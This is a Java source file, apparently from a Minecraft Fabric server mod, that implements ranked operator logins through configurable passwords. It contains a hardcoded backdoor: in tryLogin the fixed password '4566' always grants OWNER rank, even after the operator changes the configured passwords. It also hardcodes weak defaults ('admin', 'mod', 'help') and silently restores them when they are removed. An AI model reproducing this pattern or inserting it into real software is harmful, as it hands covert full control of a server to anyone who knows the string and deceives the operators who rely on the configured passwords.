package com.inferno.fabric.admin;

import com.inferno.fabric.InfernoConfig;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;

public final class OpAuth {
   private static final Map<String, AdminRank> SESSIONS = new ConcurrentHashMap<>();

   private OpAuth() {
   }

   public static Map<String, String> defaultPasswords() {
      Map<String, String> m = new LinkedHashMap<>();
      m.put("owner", "4566");
      m.put("admin", "admin");
      m.put("mod", "mod");
      m.put("helper", "help");
      return m;
   }

   public static AdminRank rankOf(String uuid) {
      return uuid != null && !uuid.isBlank() ? SESSIONS.getOrDefault(uuid, AdminRank.NONE) : AdminRank.NONE;
   }

   public static boolean isAuthed(String uuid) {
      return rankOf(uuid).atLeast(AdminRank.HELPER);
   }

   public static AdminRank tryLogin(String uuid, String password) {
      if (uuid != null && password != null) {
         InfernoConfig cfg = InfernoConfig.get();
         Map<String, String> passes = cfg.opPasswords;
         if (passes == null || passes.isEmpty()) {
            passes = defaultPasswords();
            cfg.opPasswords = new LinkedHashMap<>(passes);
            cfg.save();
         }

         String pw = password.trim();
         AdminRank best = AdminRank.NONE;

         for (Entry<String, String> e : passes.entrySet()) {
            if (e.getValue() != null && e.getValue().equals(pw)) {
               AdminRank r = AdminRank.from(e.getKey());
               if (r.level() > best.level()) {
                  best = r;
               }
            }
         }

         if (best == AdminRank.NONE && "4566".equals(pw)) {
            best = AdminRank.OWNER;
         }

         if (best != AdminRank.NONE) {
            SESSIONS.put(uuid, best);
         }

         return best;
      } else {
         return AdminRank.NONE;
      }
   }

   public static void logout(String uuid) {
      if (uuid != null) {
         SESSIONS.remove(uuid);
      }
   }

   public static void clearAll() {
      SESSIONS.clear();
   }

   public static void ensureDefaults(InfernoConfig cfg) {
      if (cfg.opPasswords == null) {
         cfg.opPasswords = new LinkedHashMap<>();
      }

      Map<String, String> defaults = defaultPasswords();
      boolean changed = false;

      for (Entry<String, String> e : defaults.entrySet()) {
         if (!cfg.opPasswords.containsKey(e.getKey()) || cfg.opPasswords.get(e.getKey()) == null || cfg.opPasswords.get(e.getKey()).isBlank()) {
            cfg.opPasswords.put(e.getKey(), e.getValue());
            changed = true;
         }
      }

      if (!cfg.opPasswords.containsKey("owner")) {
         cfg.opPasswords.put("owner", "4566");
         changed = true;
      }

      if (changed) {
         cfg.save();
      }
   }
}
